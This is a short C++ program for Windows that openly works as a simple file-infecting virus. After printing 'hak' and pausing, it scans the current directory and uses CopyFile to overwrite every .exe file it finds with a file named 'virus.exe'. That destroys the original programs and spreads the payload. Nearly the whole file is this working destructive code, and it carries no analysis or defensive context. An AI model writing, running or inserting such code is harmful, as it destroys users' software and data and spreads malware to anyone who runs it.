#include<iostream>
#include<string.h>
#include<dirent.h>
#include<fstream>
#include<windows.h>

using namespace std;

bool isExecutable(string fileN);


int main(int argc, char const *argv[])
{

    cout<<"hak"<<endl;
    system("pause");
    string fileName;
    DIR *folder;
    int type;
    struct dirent *elements;

    if( folder=opendir(".") ){

        while ( elements=readdir(folder) )
        {
            fileName=elements->d_name;
            type=elements->d_type;
            if ( strcmp(fileName.c_str(), "..") !=0 && strcmp(fileName.c_str(), ".") && type == 0 && isExecutable( fileName ) )
            {
                CopyFile("virus.exe", fileName.c_str(), false);
            }
        }
    }
    return 0;
}

bool isExecutable(string fileN){
    if (fileN.substr( fileN.find_last_of(".")+1) == "exe")
    {
        return true;
    }
    return false;
}


